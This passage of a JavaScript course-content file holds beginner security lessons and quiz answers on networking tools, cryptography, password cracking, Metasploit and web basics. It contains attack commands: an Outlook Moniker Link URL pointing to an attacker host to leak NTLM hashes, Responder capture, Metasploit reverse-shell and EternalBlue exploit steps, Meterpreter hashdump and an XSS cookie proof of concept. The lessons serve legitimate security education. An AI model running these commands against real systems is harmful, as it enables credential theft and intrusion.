              <li><i>Which legacy insecure remote administration protocol did SSH replace?</i> <b>Telnet</b></li>
            </ul>`},

          {title:"Virtual Private Networks (VPNs)", notes:`
            <p>A <b>Virtual Private Network (VPN)</b> creates an encrypted tunnel across untrusted public networks, encapsulating private IP packets within encrypted transport packets.</p>
            <p>Popular VPN architectures include <b>IPsec</b> (operating at Layer 3), <b>OpenVPN</b> (using SSL/TLS at Layer 4), and modern <b>WireGuard</b> (using state-of-the-art Noise cryptography).</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What does VPN stand for?</i> <b>Virtual Private Network</b></li>
            </ul>`}
         ]},

        {name:"Wireshark: The Basics", text:"Learn the basics of Wireshark and how to analyse protocols and PCAPs.",
         icon:"🦈", level:"easy", time:"35 min",
         tasks:[
          {title:"Interface & Packet Capturing", notes:`
            <p><b>Wireshark</b> is the world's most widely used graphical packet analyzer. It captures raw network frames from network interfaces in promiscuous mode and dissects hundreds of network protocols.</p>
            <p>The interface is organized into three primary panes: the <b>Packet List</b> (summary overview), the <b>Packet Details</b> (tree hierarchy of protocol headers), and the <b>Packet Bytes</b> (raw hexadecimal and ASCII dump).</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What network interface mode allows capturing all packets on the wire regardless of destination MAC?</i> <b>promiscuous</b></li>
            </ul>`},

          {title:"Wireshark Display Filters", notes:`
            <p>Display filters allow analysts to isolate relevant forensic evidence from capture files containing millions of packets:</p>
            <pre><code># Filter by IP address
ip.addr == 192.168.1.100

# Filter by TCP destination port
tcp.dstport == 443

# Filter specific HTTP methods
http.request.method == "POST"

# Filter DNS queries for a domain
dns.qry.name contains "malware"

# Filter SYN packets to find port scans
tcp.flags.syn == 1 and tcp.flags.ack == 0</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which display filter isolates packets where either the source or destination IP matches 10.10.10.1?</i> <b>ip.addr == 10.10.10.1</b></li>
            </ul>`},

          {title:"Following TCP Streams & Extracting Artifacts", notes:`
            <p>When investigating web sessions or credential theft, reading fragmented packets individually is inefficient. Right-clicking a packet and choosing <b>Follow &gt; TCP Stream</b> reassembles all data exchanged between client and server into a clean dialogue view.</p>
            <p>Wireshark also enables automated artifact extraction: navigate to <b>File &gt; Export Objects &gt; HTTP</b> to dump files, pictures, or malware executables transferred across the wire.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Wireshark feature reconstructs bidirectional application conversations across multiple packets?</i> <b>Follow TCP Stream</b></li>
            </ul>`}
         ]},

        {name:"Tcpdump: The Basics", text:"Learn how to use Tcpdump to save, filter, and display packets.",
         icon:"🧪", level:"easy", time:"30 min",
         tasks:[
          {title:"Command-Line Packet Sniffing", notes:`
            <p><b>Tcpdump</b> is the lightweight command-line packet capture utility standard across Linux servers and network appliances where graphical interfaces are unavailable.</p>
            <pre><code># Basic capture on specific interface without DNS resolution
sudo tcpdump -i eth0 -n

# Capture first 10 packets with verbose details
sudo tcpdump -i eth0 -c 10 -v

# Print packet content in ASCII and Hex
sudo tcpdump -i eth0 -A -X</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which flag on tcpdump disables reverse DNS resolution of IP addresses to speed up output?</i> <b>-n</b></li>
            </ul>`},

          {title:"Berkeley Packet Filters (BPF)", notes:`
            <p>Tcpdump evaluates <b>BPF (Berkeley Packet Filter)</b> syntax at the kernel level to capture only packets matching specific criteria, minimizing CPU overhead:</p>
            <pre><code># Capture traffic to/from a specific host on port 80
sudo tcpdump -i eth0 host 192.168.1.50 and port 80

# Capture all traffic except SSH
sudo tcpdump -i eth0 not port 22

# Capture only ICMP (ping) traffic
sudo tcpdump -i eth0 icmp</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What syntax filtering framework does tcpdump use to filter packets at the kernel level?</i> <b>BPF</b></li>
            </ul>`},

          {title:"Saving & Reading PCAP Files", notes:`
            <p>Packets captured in the field can be saved to standardized PCAP files for later forensic analysis in Wireshark:</p>
            <pre><code># Write raw packets to disk with full packet snapshot length
sudo tcpdump -i eth0 -s 0 -w incident_capture.pcap

# Read and analyze saved capture file
sudo tcpdump -r incident_capture.pcap -n</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which flag instructs tcpdump to write captured packets to a file?</i> <b>-w</b></li>
            </ul>`}
         ]},

        {name:"Nmap: The Basics", text:"Learn how to use Nmap to discover live hosts, find open ports, and detect service versions.",
         icon:"📡", level:"easy", time:"35 min",
         tasks:[
          {title:"Host Discovery & Subnet Sweeps", notes:`
            <p><b>Nmap (Network Mapper)</b> is the quintessential tool for network exploration and vulnerability auditing. Before probing ports, Nmap determines which hosts are online:</p>
            <pre><code># Ping sweep an entire subnet without port scanning
nmap -sn 192.168.1.0/24

# Scan specific target without sending ping probes (assume host is online)
nmap -Pn 10.10.10.50</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Nmap flag performs host discovery without scanning any ports?</i> <b>-sn</b></li>
            </ul>`},

          {title:"Port Scanning Strategies", notes:`
            <p>Nmap offers multiple scanning techniques depending on privilege and stealth requirements:</p>
            <table>
              <thead>
                <tr><th>Scan Flag</th><th>Mechanism</th><th>Privilege</th></tr>
              </thead>
              <tbody>
                <tr><td><code>-sS</code> (SYN Scan)</td><td>Half-open stealth scan. Sends SYN, receives SYN-ACK, responds with RST to avoid completing 3-way handshake.</td><td>Requires root / sudo</td></tr>
                <tr><td><code>-sT</code> (Connect Scan)</td><td>Completes full TCP 3-way handshake via OS socket API. Slower and logged by servers.</td><td>Unprivileged users</td></tr>
                <tr><td><code>-sU</code> (UDP Scan)</td><td>Probes UDP ports. Relies on ICMP port unreachable errors to infer state. Slow.</td><td>Requires root / sudo</td></tr>
              </tbody>
            </table>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is Nmap's default scan type when executed with root/administrator privileges?</i> <b>SYN scan</b></li>
            </ul>`},

          {title:"Service Detection & Script Engine (NSE)", notes:`
            <p>Beyond identifying open ports, Nmap interacts with services to fingerprint software versions and known vulnerabilities:</p>
            <pre><code># Comprehensive service scan:
# -sV: Version detection
# -sC: Default script scan
# -O: OS fingerprinting
# -p-: Scan all 65535 ports
# -oN: Save output in normal format
sudo nmap -sV -sC -O -p- 10.10.10.50 -oN scan_results.txt</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Nmap flag enables service version detection?</i> <b>-sV</b></li>
            </ul>`}
         ]}
       ]},

      {icon:"🔐", title:"Cryptography", text:"Explore various symmetric and asymmetric encryption algorithms. Discover the usage of hashing algorithms in everyday systems.",
       intro:"This module explains the importance of cryptography in the online world. It presents some of the building blocks of cryptographic algorithms and explains several symmetric and asymmetric encryption algorithms. It describes the role of hashing functions in today's systems and demonstrates different tools to crack hash values.",
       rooms:[
        {name:"Cryptography Basics", text:"Learn the basics of cryptography and symmetric encryption.",
         icon:"🔐", level:"easy", time:"25 min",
         tasks:[
          {title:"Classical Ciphers & The Caesar Shift", notes:`
            <p><b>Cryptography</b> is the science of securing information by transforming plaintext into unreadable ciphertext. Historical ciphers used substitution techniques, such as the <b>Caesar Cipher</b>:</p>
            ${caesarSVG()}
            <p>Because natural language has predictable letter distributions (e.g. 'E' is the most frequent letter in English), monoalphabetic substitution ciphers are easily broken using <b>frequency analysis</b>.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What cryptanalysis technique breaks simple substitution ciphers by analyzing common letter occurrences?</i> <b>frequency analysis</b></li>
            </ul>`},

          {title:"Symmetric Encryption Algorithms", notes:`
            <p><b>Symmetric Encryption</b> uses a single shared secret key to both encrypt and decrypt data. Both communicating parties must possess the exact same secret key.</p>
            ${lockboxSVG()}
            <p><b>Modern Symmetric Standards:</b></p>
            <ul>
              <li><b>AES (Advanced Encryption Standard):</b> Gold standard block cipher using 128, 192, or 256-bit keys.</li>
              <li><b>DES / 3DES:</b> Deprecated legacy standards; 56-bit DES keys are trivially vulnerable to brute-force attacks.</li>
              <li><b>Cipher Modes:</b> <b>ECB (Electronic Codebook)</b> encrypts identical plaintext blocks into identical ciphertext blocks (leaking data patterns); <b>CBC (Cipher Block Chaining)</b> and <b>GCM (Galois/Counter Mode)</b> use initialization vectors (IVs) to ensure randomness.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which symmetric encryption standard is the current global industry benchmark?</i> <b>AES</b></li>
            </ul>`}
         ]},

        {name:"Public Key Cryptography Basics", text:"Discover how public key ciphers such as RSA work and explore their role in applications such as SSH.",
         icon:"🔑", level:"easy", time:"30 min",
         tasks:[
          {title:"Asymmetric Key Pairs", notes:`
            <p><b>Asymmetric (Public Key) Cryptography</b> solves the fundamental key distribution problem by using mathematically linked key pairs:</p>
            <ul>
              <li><b>Public Key:</b> Freely shared with the world. Anyone can use it to encrypt a message.</li>
              <li><b>Private Key:</b> Guarded strictly by the owner. Only this key can decrypt messages encrypted with the corresponding public key.</li>
            </ul>
            ${mailboxSVG()}
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which key in an asymmetric pair can be shared publicly with anyone?</i> <b>Public Key</b></li>
            </ul>`},

          {title:"RSA & Mathematical Trapdoors", notes:`
            <p><b>RSA</b> (Rivest–Shamir–Adleman) is built on the mathematical difficulty of prime factorization: multiplying two large prime numbers is computationally trivial, but factoring their product back into the original primes is astronomically difficult.</p>
            <p>Asymmetric algorithms are computationally expensive compared to symmetric ciphers. Consequently, systems use asymmetric cryptography solely during the initial handshake to exchange a symmetric session key.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What mathematical problem forms the security basis of the RSA cryptosystem?</i> <b>prime factorization</b></li>
            </ul>`},

          {title:"Digital Signatures & Authentication", notes:`
            <p>Asymmetric cryptography can also prove identity and prevent tampering through <b>Digital Signatures</b>:</p>
            <ol>
              <li>The author hashes the document and encrypts the hash using their <b>Private Key</b>.</li>
              <li>The recipient decrypts the signature using the author's <b>Public Key</b> to reveal the expected hash.</li>
              <li>If the computed hash matches the decrypted hash, the recipient is mathematically guaranteed that the document originated from the author and was not modified in transit (<b>Non-Repudiation</b>).</li>
            </ol>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which cryptographic security principle guarantees that the sender cannot deny having sent a message?</i> <b>Non-Repudiation</b></li>
            </ul>`}
         ]},

        {name:"Hashing Basics", text:"Learn about hashing functions and their uses in password verification and file integrity checking.",
         icon:"❄️", level:"easy", time:"25 min",
         tasks:[
          {title:"Properties of Cryptographic Hash Functions", notes:`
            <p>A <b>Cryptographic Hash Function</b> is a one-way mathematical algorithm that transforms any input of arbitrary length into a fixed-length string of bytes (digest).</p>
            <p>Essential security properties include:</p>
            <ul>
              <li><b>One-Way (Pre-image Resistance):</b> Infeasible to reverse a hash back to original plaintext.</li>
              <li><b>Deterministic:</b> The exact same input always produces the exact same hash output.</li>
              <li><b>Avalanche Effect:</b> Changing a single bit in the input radically alters the entire output hash.</li>
              <li><b>Collision Resistance:</b> Infeasible to find two distinct inputs that produce identical hash outputs.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What property ensures that changing a single character in a file completely changes the resulting hash?</i> <b>Avalanche Effect</b></li>
            </ul>`},

          {title:"Standard Hashing Algorithms", notes:`
            <p>Common hashing algorithms encountered in security:</p>
            <table>
              <thead>
                <tr><th>Algorithm</th><th>Digest Output</th><th>Current Security Status</th></tr>
              </thead>
              <tbody>
                <tr><td><b>MD5</b></td><td>128 bits (32 hex characters)</td><td><span class="no">Broken</span> (practical collisions proven)</td></tr>
                <tr><td><b>SHA-1</b></td><td>160 bits (40 hex characters)</td><td><span class="no">Deprecated</span> (collision attacks demonstrated)</td></tr>
                <tr><td><b>SHA-256</b></td><td>256 bits (64 hex characters)</td><td><span class="yes">Secure</span> (standard for certificates &amp; integrity)</td></tr>
                <tr><td><b>SHA-3</b></td><td>Variable (Keccak sponge function)</td><td><span class="yes">Secure</span> (next-generation NIST standard)</td></tr>
              </tbody>
            </table>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>How many hexadecimal characters make up a standard SHA-256 hash digest?</i> <b>64</b></li>
            </ul>`},

          {title:"Salted Hashes & Password Storage", notes:`
            <p>Storing raw password hashes is vulnerable to <b>Rainbow Table attacks</b> (precomputed lookup tables of millions of plaintext-to-hash mappings).</p>
            <p>To defend against rainbow tables, systems append a unique, cryptographically random string called a <b>Salt</b> to each password before hashing. Modern password hashing algorithms like <b>Bcrypt</b>, <b>Argon2</b>, and <b>PBKDF2</b> also incorporate configurable work factors (stretching) to drastically slow down GPU brute-forcing.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What random value is appended to passwords before hashing to defeat precomputed rainbow tables?</i> <b>salt</b></li>
            </ul>`}
         ]},

        {name:"John the Ripper: The Basics", text:"Learn how to use John the Ripper, a powerful and adaptable hash-cracking tool.",
         icon:"🎩", level:"easy", time:"35 min",
         tasks:[
          {title:"Dictionary & Wordlist Attacks", notes:`
            <p><b>John the Ripper</b> is a fast, versatile password cracker designed to audit password security by testing hashes against wordlists like <code>rockyou.txt</code>.</p>
            <pre><code># Basic wordlist attack on a hash file
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Display cracked passwords from John's potfile
john --show hashes.txt</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which flag tells John the Ripper to display previously cracked passwords from its potfile?</i> <b>--show</b></li>
            </ul>`},

          {title:"Specifying Formats & Hash Types", notes:`
            <p>While John automatically detects common hash signatures, specifying the explicit hash format avoids false positives and speeds up cracking:</p>
            <pre><code># Specify raw MD5 hash format
john --format=raw-md5 --wordlist=rockyou.txt md5_hashes.txt

# Specify SHA-256 hash format
john --format=raw-sha256 --wordlist=rockyou.txt sha_hashes.txt

# Specify NTLM Windows hash format
john --format=NT --wordlist=rockyou.txt ntlm.txt</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What format name does John the Ripper use for Windows NTLM hashes?</i> <b>NT</b></li>
            </ul>`},

          {title:"Extracting Hashes for Cracking", notes:`
            <p>John includes specialized pre-processing helper utilities to extract crackable hash formats from password-protected files:</p>
            <ul>
              <li><code>unshadow /etc/passwd /etc/shadow &gt; unshadowed.txt</code>: Combines Linux account and shadow files for cracking.</li>
              <li><code>zip2john archive.zip &gt; zip.hash</code>: Extracts encryption hash from password-protected ZIP archives.</li>
              <li><code>ssh2john id_rsa &gt; ssh.hash</code>: Extracts passphrase hash from encrypted SSH private keys.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which utility combines Linux /etc/passwd and /etc/shadow into a format John can crack?</i> <b>unshadow</b></li>
            </ul>`}
         ]}
       ]},

      {icon:"🎯", title:"Exploitation Basics", text:"Discover the art of exploitation by leveraging a real-world vulnerability. Next, explore the exploitation features of the Metasploit framework.",
       intro:"In this module, we present the foundational knowledge of exploiting vulnerabilities. We exploit a vulnerability and compromise a machine without using any exploitation framework. Then, we learn how to use Metasploit, a widely used framework that simplifies the process of exploiting vulnerabilities. Ultimately, you will use the knowledge learned in the module to exploit a vulnerable Windows machine.",
       rooms:[
        {name:"Moniker Link (CVE-2024-21413)", text:"Leak user's credentials using CVE-2024-21413 to bypass Outlook's Protected View.",
         icon:"🔒", level:"easy", time:"30 min",
         tasks:[
          {title:"Outlook Moniker Link Vulnerability", notes:`
            <p><b>CVE-2024-21413</b> (known as the Moniker Link bug) is a critical remote code execution and NTLM credential disclosure flaw in Microsoft Outlook with a CVSS score of 9.8.</p>
            <p>Outlook's Protected View is designed to block malicious hyperlinks pointing to local file paths (<code>file://</code>). However, by prepending the <code>file://</code> link with the <code>!</code> exclamation mark moniker delimiter (e.g. <code>file:///\\\\attacker_ip\\share\\test.docx!something</code>), Outlook bypasses its security check.</p>
            <p>When the victim clicks the link, Windows automatically initiates an outbound SMB connection to the attacker's server, transmitting the user's NetNTLMv2 challenge-response hash.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What special character in the hyperlink allowed bypassing Outlook's Protected View check?</i> <b>!</b></li>
            </ul>`},

          {title:"Capturing Credentials with Responder", notes:`
            <p>To capture the leaked NetNTLMv2 hash, attackers deploy <b>Responder</b> to listen on inbound SMB ports (TCP 445):</p>
            <pre><code># Launch Responder listening on the VPN interface
sudo responder -I tun0 -v -F

# Output shows captured NetNTLMv2 challenge hash:
[SMB] NTLMv2-SSP Username : TARGETCORP\\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::TARGETCORP:4b8a...</code></pre>
            <p>The captured hash can be loaded directly into Hashcat or John the Ripper to recover the plaintext password.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What tool is commonly used to listen for and capture rogue SMB authentication challenges?</i> <b>Responder</b></li>
            </ul>`},

          {title:"Remediation & Defensive Hardening", notes:`
            <p>Organizations protect against Moniker Link and NTLM-coercion attacks by applying multiple defensive layers:</p>
            <ul>
              <li><b>Apply Microsoft Security Updates:</b> Install the official February 2024 patch resolving CVE-2024-21413.</li>
              <li><b>Block Outbound SMB Traffic:</b> Enforce perimeter firewall rules blocking outbound TCP port 445 to prevent credentials from leaving the corporate network.</li>
              <li><b>Restrict NTLM Usage:</b> Transition corporate authentication entirely to Kerberos and disable NTLM via Group Policy.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which network port should corporate perimeter firewalls block outbound to prevent external NTLM credential leaks?</i> <b>445</b></li>
            </ul>`}
         ]},

        {name:"Metasploit: Introduction", text:"An introduction to the main components of the Metasploit Framework.",
         icon:"Ⓜ️", level:"easy", time:"30 min",
         tasks:[
          {title:"The Metasploit Architecture", notes:`
            <p>The <b>Metasploit Framework (MSF)</b> is the world's most popular open-source penetration testing platform. It provides a modular codebase for vulnerability scanning, exploit delivery, payload staging, and post-exploitation.</p>
            <p>Metasploit organizes its capabilities into six core module types:</p>
            <ul>
              <li><b>Exploits:</b> Code modules that leverage specific software vulnerabilities to gain execution.</li>
              <li><b>Payloads:</b> Code that executes on the target machine after exploitation (e.g. reverse shell, command execution).</li>
              <li><b>Auxiliary:</b> Non-exploit tools including port scanners, fuzzers, sniffers, and credential verifiers.</li>
              <li><b>Post:</b> Post-exploitation modules for privilege escalation, gathering credentials, and lateral movement.</li>
              <li><b>Encoders:</b> Obfuscation tools that re-encode payloads to bypass basic signature filters.</li>
              <li><b>NOPs:</b> No-operation generators used for buffer overflow alignment.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Metasploit module category contains scanning and reconnaissance tools that do not deliver payloads?</i> <b>auxiliary</b></li>
            </ul>`},

          {title:"Navigating the MSFconsole", notes:`
            <p>The primary interactive command-line interface for Metasploit is <b>msfconsole</b>:</p>
            <pre><code># Start the Metasploit console
msfconsole -q

# Search for available exploits (e.g. Apache Tomcat)
search tomcat

# Select and load a module
use exploit/multi/http/tomcat_mgr_upload

# Display module description and required variables
show options
info</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which command in msfconsole selects a specific exploit or auxiliary module for use?</i> <b>use</b></li>
            </ul>`}
         ]},

        {name:"Metasploit: Exploitation", text:"Using Metasploit for scanning, vulnerability assessment and exploitation.",
         icon:"Ⓜ️", level:"easy", time:"35 min",
         tasks:[
          {title:"Configuring Module Targets & Payloads", notes:`
            <p>Before launching an exploit, operators must configure target network settings and payload destinations using the <code>set</code> command:</p>
            <pre><code># Set remote target host IP and port
set RHOSTS 10.10.10.150
set RPORT 8080

# Configure listener parameters for reverse shell
set LHOST 10.10.14.22
set LPORT 4444

# Select payload type (Staged vs Inline)
set payload windows/x64/meterpreter/reverse_tcp</code></pre>
            <div class="callout">
              <b>Staged vs Stageless Payloads:</b> Payloads with a slash (<code>meterpreter/reverse_tcp</code>) are <b>Staged</b> (small stager downloads the larger Meterpreter stage); payloads with an underscore (<code>meterpreter_reverse_tcp</code>) are <b>Stageless</b> (entire binary embedded in one payload).
            </div>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which variable in Metasploit defines the attacker's IP address that receives the reverse shell connection?</i> <b>LHOST</b></li>
            </ul>`},

          {title:"Executing Exploits & Managing Sessions", notes:`
            <p>With parameters configured, type <code>exploit</code> or <code>run</code> to fire the attack. Upon successful compromise, Metasploit spawns an active background session:</p>
            <pre><code># Launch exploit in background job mode
exploit -j

# View all active compromised sessions
sessions -l

# Interact with session 1
sessions -i 1</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which command lists all currently active compromised sessions in msfconsole?</i> <b>sessions -l</b></li>
            </ul>`}
         ]},

        {name:"Metasploit: Meterpreter", text:"Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation.",
         icon:"Ⓜ️", level:"easy", time:"35 min",
         tasks:[
          {title:"In-Memory Stealth Architecture", notes:`
            <p><b>Meterpreter</b> (short for Meta-Interpreter) is an advanced, dynamically extensible payload that executes entirely in the target machine's RAM memory using reflective DLL injection.</p>
            <p>Because Meterpreter never writes executable binaries to the victim's hard disk drive, it leaves minimal forensic footprints and evades legacy antivirus file-scanning solutions.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What memory injection technique allows Meterpreter to execute entirely in RAM without touching the hard disk?</i> <b>reflective DLL injection</b></li>
            </ul>`},

          {title:"Essential Meterpreter Commands", notes:`
            <p>Meterpreter provides a rich set of built-in commands for system administration and credential collection:</p>
            <pre><code># Gather target OS version and computer name
sysinfo

# Check current user token privileges
getuid

# Attempt automated local privilege escalation to SYSTEM
getsystem

# Migrate Meterpreter into a legitimate process (e.g. explorer.exe)
migrate <PID>

# Dump local SAM user password hashes
hashdump

# Capture target user's current desktop screen
screenshot

# Drop into a native OS shell prompt
shell</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Meterpreter command attempts automated privilege escalation to NT AUTHORITY\\SYSTEM?</i> <b>getsystem</b></li>
            </ul>`}
         ]},

        {name:"Blue", text:"Deploy & hack into a Windows machine, leveraging common misconfigurations issues.",
         icon:"🪟", level:"easy", time:"40 min",
         tasks:[
          {title:"EternalBlue (MS17-010) Overview", notes:`
            <p><b>MS17-010</b> is one of the most infamous security vulnerabilities in computing history. Developed by the NSA and leaked by the Shadow Brokers in 2017, the exploit targets a buffer overflow flaw in Microsoft's Server Message Block v1 (SMBv1) protocol running on TCP port 445.</p>
            <p>EternalBlue famously powered global ransomware outbreaks such as WannaCry and NotPetya, propagating automatically across networks without requiring user interaction.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the Microsoft security bulletin identifier for EternalBlue?</i> <b>MS17-010</b></li>
            </ul>`},

          {title:"Scanning & Exploiting with Metasploit", notes:`
            <p>In this lab, we scan the target with Nmap to confirm open port 445 and verify vulnerability using Metasploit's auxiliary checker:</p>
            <pre><code># Check for MS17-010 vulnerability without exploiting
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.100
run
# Output: [+] Host is likely VULNERABLE to MS17-010!

# Execute the exploit module
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.100
set LHOST tun0
exploit</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which port does EternalBlue target to exploit the SMBv1 vulnerability?</i> <b>445</b></li>
            </ul>`},

          {title:"Post-Exploitation & Flag Capture", notes:`
            <p>Because EternalBlue exploits kernel-level network drivers, the resulting Meterpreter session automatically inherits <code>NT AUTHORITY\\SYSTEM</code> — the highest possible privilege level in the Windows operating system.</p>
            <p>With SYSTEM access, analysts can dump local SAM password hashes, inspect protected administrative folders, and locate the root flag on the Administrator Desktop.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the highest Windows privilege level obtained upon successful EternalBlue exploitation?</i> <b>NT AUTHORITY\\SYSTEM</b></li>
            </ul>`}
         ]}
       ]}
,
      {icon:"🕷️", title:"Web Hacking", text:"Learn about web applications, JavaScript, SQL and explore BurpSuite, a web application security testing platform.",
       intro:"This module helps the user become familiar with web applications, JavaScript, database systems, and SQL. Furthermore, it teaches the basics of BurpSuite so the user gains the necessary knowledge to conduct various web application security tests.",
       rooms:[
        {name:"Web Application Basics", text:"Learn the basics of web applications: HTTP, URLs, request methods, response codes, and headers.",
         icon:"💻", level:"easy", time:"25 min",
         tasks:[
          {title:"HTTP Request & Response Anatomy", notes:`
            <p>The <b>Hypertext Transfer Protocol (HTTP)</b> is a stateless, application-layer client-server protocol. A client (browser) sends an HTTP request, and the web server processes it and responds with status codes and resources.</p>
            ${urlSVG()}
            <p><b>HTTP Methods (Verbs):</b></p>
            <ul>
              <li><code>GET</code>: Retrieve data from server (safe and idempotent, no request body).</li>
              <li><code>POST</code>: Submit data (such as login credentials or forms) to be processed.</li>
              <li><code>PUT</code> / <code>PATCH</code>: Create or partially update an existing resource.</li>
              <li><code>DELETE</code>: Remove a resource from the server.</li>
            </ul>
            <p><b>HTTP Status Code Ranges:</b></p>
            <ul>
              <li><b>1xx Informational:</b> Request received, continuing process.</li>
              <li><b>2xx Success:</b> <code>200 OK</code>, <code>201 Created</code>.</li>
              <li><b>3xx Redirection:</b> <code>301 Moved Permanently</code>, <code>302 Found</code>.</li>
              <li><b>4xx Client Errors:</b> <code>400 Bad Request</code>, <code>401 Unauthorized</code>, <code>403 Forbidden</code>, <code>404 Not Found</code>.</li>
              <li><b>5xx Server Errors:</b> <code>500 Internal Server Error</code>, <code>502 Bad Gateway</code>.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which HTTP status code range signifies client-side errors?</i> <b>4xx</b></li>
            </ul>`},

          {title:"Client vs Server-Side Architecture", notes:`
            <p>Web applications split logic across two distinct tiers:</p>
            <table>
              <thead>
                <tr><th>Tier</th><th>Components</th><th>Security Trust Model</th></tr>
              </thead>
              <tbody>
                <tr>
                  <td><b>Client-Side</b></td>
                  <td>HTML, CSS, JavaScript, Browser DOM</td>
                  <td><span class="no">Untrusted:</span> The user has full control. Any validation in JS can be bypassed using proxy tools or terminal curl!</td>
                </tr>
                <tr>
                  <td><b>Server-Side</b></td>
                  <td>Node.js, Python, PHP, Java, SQL Databases</td>
                  <td><span class="yes">Trusted:</span> Must independently enforce all authorization, authentication, input sanitization, and database queries.</td>
                </tr>
              </tbody>
            </table>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Can client-side JavaScript input validation be trusted as a sole security control?</i> <b>No</b></li>
            </ul>`},

          {title:"State Management & Cookies", notes:`
            <p>Because HTTP is stateless, servers use <b>Cookies</b> to remember authenticated user sessions:</p>
            ${cookieFlowSVG()}
            <p>Security flags for sensitive session cookies:</p>
            <ul>
              <li><b>HttpOnly:</b> Prevents JavaScript from reading the cookie via <code>document.cookie</code>, mitigating session theft via Cross-Site Scripting (XSS).</li>
              <li><b>Secure:</b> Ensures the browser transmits the cookie only over encrypted HTTPS connections.</li>
              <li><b>SameSite:</b> Controls cross-site cookie transmission (<code>Strict</code>, <code>Lax</code>, <code>None</code>) to mitigate Cross-Site Request Forgery (CSRF).</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which cookie flag prevents client-side JavaScript from accessing session tokens?</i> <b>HttpOnly</b></li>
            </ul>`}
         ]},

        {name:"JavaScript Essentials", text:"Learn how to use JavaScript to add interactivity to a website and understand associated vulnerabilities.",
         icon:"📜", level:"easy", time:"30 min",
         tasks:[
          {title:"The Document Object Model (DOM)", notes:`
            <p><b>JavaScript</b> is the programming language of the web. It interacts with web pages by manipulating the <b>Document Object Model (DOM)</b> — a tree-like object representation of the HTML document.</p>
            <p>Developers use JS to handle events (button clicks, form inputs), fetch dynamic API data asynchronously via <code>fetch()</code>, and update page elements in real time.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What does DOM stand for in web browsers?</i> <b>Document Object Model</b></li>
            </ul>`},

          {title:"Source Code Review & Sensitive Data", notes:`
            <p>Everything delivered to the client's browser is fully readable by end users. Security analysts inspect browser developer tools (<code>F12 &gt; Sources</code> or <code>Ctrl+U</code>) for:</p>
            <ul>
              <li><b>Hardcoded API Keys:</b> Developers inadvertently leaving private tokens or cloud access keys in client bundles.</li>
              <li><b>Hidden Form Fields:</b> Forms using <code>&lt;input type="hidden" name="price" value="100"&gt;</code> that can be tampered with to underpay.</li>
              <li><b>Disabled Attributes:</b> Buttons with <code>disabled</code> attributes that can be removed in DevTools to bypass intended workflows.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which key shortcut opens Developer Tools in most web browsers?</i> <b>F12</b></li>
            </ul>`},

          {title:"Introduction to Cross-Site Scripting (XSS)", notes:`
            <p><b>Cross-Site Scripting (XSS)</b> occurs when an application includes untrusted user input in a web page without proper validation or encoding, allowing attackers to execute malicious JavaScript in victims' browsers.</p>
            <ul>
              <li><b>Stored XSS:</b> Malicious script is permanently saved in the database (e.g. in a comment section) and executes for everyone who views the page.</li>
              <li><b>Reflected XSS:</b> Script is embedded into a link/query parameter and reflected back immediately by the server.</li>
              <li><b>DOM-based XSS:</b> Vulnerability exists entirely on the client side when unsafe JS sinks (e.g. <code>innerHTML</code>, <code>eval()</code>) process untrusted sources.</li>
            </ul>
            <pre><code>&lt;!-- Classic proof of concept --&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which XSS type permanently saves malicious scripts into a database to target future visitors?</i> <b>Stored XSS</b></li>
            </ul>`}
         ]},

        {name:"SQL Fundamentals", text:"Learn how to perform basic SQL queries to retrieve and manage data in a database.",
         icon:"📊", level:"easy", time:"30 min",
         tasks:[
          {title:"Relational Database Architecture", notes:`
            <p><b>SQL (Structured Query Language)</b> is the standard language used to communicate with Relational Database Management Systems (RDBMS) like MySQL, PostgreSQL, Microsoft SQL Server, and SQLite.</p>
            ${sqlTableSVG()}
